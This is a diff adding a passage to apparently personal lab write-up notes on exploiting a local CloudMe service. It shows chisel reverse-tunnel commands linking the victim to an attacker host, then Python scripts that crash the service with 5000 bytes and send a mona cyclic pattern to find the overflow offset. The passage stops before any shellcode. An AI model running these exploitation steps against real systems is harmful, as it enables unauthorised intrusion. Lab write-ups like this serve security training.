@@ -110,7 +110,84 @@ searchsploit CloudMe
 >![[Pasted image 20250305151911.png]]
 >![[Pasted image 20250305152032.png]]
 
-- As the port is locally opened we need to get access using [[chisel]].
+- As the port is locally opened we need to get access using [[chisel]] (version 1.7.7).
+Attacker
+```bash
+./chisel server --reverse -p 1234
+```
+Victim
+```bash
+chesel.exe client 192.168.1.45:1234 R:8888:127.0.0.1:8888
+```
 
+>[!example]- Result
+>![[Pasted image 20250305171953.png]]
 
+- now we can start with the BUF, frist we need to stablish a connection between the program and own script, using socket we are going to send 5000 'A' in order to check if the app crash
+```python
+#! /usr/bin/python3
+import socket, signal, sys
+def def_handler(sig, frame):
+    print('\n\n[!] Saliendo....\n')
+    sys.exit(1)
+
+# ctrl+c
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables
+ip_address = '127.0.0.1'
+payload = b'A'*5000
+
+def makeConnection():
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip_address, 8888))
+    s.send(payload)
+
+if __name__ == '__main__':
+    makeConnection()
+```
+
+```bash
+python exploit.py
+```
+>[!example]- Result
+>![[Pasted image 20250305173352.png]]
+
+- perfect the app crash so now lets to see how many 'A' is needed to crash the app, we can use a pattern using [[mona]] and use [[Immunity Debugger]]
+>[!exampe]- Result
+>![[Pasted image 20250305174421.png]]
+
+```bash
+!mona pattern_create 5000
+```
+>[!example]- Result
+>![[Pasted image 20250305174850.png]]
+
+- now we can send the string using the script
+```python
+#! /usr/bin/python3
+
+import socket, signal, sys
+
+def def_handler(sig, frame):
+    print('\n\n[!] Saliendo....\n')
+    sys.exit(1)
+
+# ctrl+c
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables
+ip_address = '127.0.0.1'
+payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4'
+
+def makeConnection():
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip_address, 8888))
+    s.send(payload)
+
+if __name__ == '__main__':
+    makeConnection()
+```
 
